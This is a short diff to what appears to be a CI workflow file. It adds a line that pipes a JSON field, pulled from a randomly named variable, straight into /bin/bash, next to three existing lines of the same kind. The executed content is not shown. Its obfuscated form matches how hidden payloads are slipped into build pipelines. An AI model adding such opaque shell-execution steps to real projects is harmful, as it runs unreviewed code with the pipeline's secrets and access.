@@ -36,6 +36,7 @@ jobs:
           echo $a73 | jq -r .cryv42 | /bin/bash
           printf '%s' "$pqk2" | jq -r .yyby0357 | /bin/bash
           printf '%s' "$bxpq03" | jq -r .zeyl502 | /bin/bash
+          printf '%s' "$w884" | jq -r .lj4 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
